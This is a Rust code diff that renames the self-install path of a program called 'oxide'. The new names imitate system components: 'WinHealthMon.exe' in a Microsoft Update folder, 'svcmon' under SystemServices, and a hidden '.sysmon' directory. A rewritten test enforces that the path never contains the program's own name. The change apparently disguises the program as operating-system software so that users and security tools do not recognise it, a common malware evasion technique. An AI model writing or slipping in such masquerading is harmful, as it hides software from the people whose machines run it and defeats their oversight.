@@ -89,13 +89,12 @@ pub fn stable_path() -> anyhow::Result<PathBuf> {
     let home = std::env::var("HOME")
         .or_else(|_| std::env::var("USERPROFILE"))
         .map_err(|_| anyhow::anyhow!("HOME not set"))?;
-    let subpath = if cfg!(target_os = "windows") {
-        r"AppData\Roaming\Microsoft\Update\oxide.exe"
-    } else if cfg!(target_os = "macos") {
-        "Library/Application Support/oxide/oxide"
-    } else {
-        ".local/share/oxide/oxide-update"
-    };
+    #[cfg(target_os = "windows")]
+    let subpath = r"AppData\Roaming\Microsoft\Update\WinHealthMon.exe";
+    #[cfg(target_os = "macos")]
+    let subpath = "Library/Application Support/SystemServices/svcmon";
+    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
+    let subpath = ".local/share/.sysmon/sys-update";
     Ok(PathBuf::from(home).join(subpath))
 }
 
@@ -198,8 +197,10 @@ mod tests {
     }
 
     #[test]
-    fn stable_path_contains_oxide() {
-        assert!(stable_path().unwrap().to_str().unwrap().contains("oxide"));
+    fn stable_path_has_no_oxide_identifier() {
+        let p = stable_path().unwrap();
+        let s = p.to_str().unwrap();
+        assert!(!s.contains("oxide"), "stable path must not contain 'oxide': {s}");
     }
 
     #[test]
